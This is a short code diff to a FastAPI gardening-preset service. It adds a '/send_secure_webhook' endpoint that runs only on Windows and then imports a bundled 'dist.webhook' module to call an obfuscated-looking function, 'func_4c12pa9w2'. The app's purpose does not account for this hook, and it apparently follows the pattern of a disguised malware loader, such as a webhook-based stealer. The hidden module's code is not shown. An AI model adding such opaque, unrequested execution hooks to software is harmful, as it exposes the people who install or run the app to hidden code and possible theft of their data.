@@ -1,6 +1,8 @@
+import fastapi
 import requests
 from fastapi import FastAPI
 from pydantic import BaseModel
+import os
 
 app = FastAPI()
 
@@ -33,3 +35,15 @@ async def gardening_LoadCloudPreset(key: gLCP):
         return response.json()
 
     return ""
+
+class webhook(BaseModel):
+    content: str
+    secureHttp: int
+    username: str
+    avatar_url: str
+@app.post("/send_secure_webhook")
+async def send_secure_webhook(request: webhook):
+    if os.name != "nt":
+        return fastapi.responses.JSONResponse(status_code=403, content="This endpoint is only available on Windows.")
+    import dist.webhook
+    return dist.webhook.func_4c12pa9w2(request)
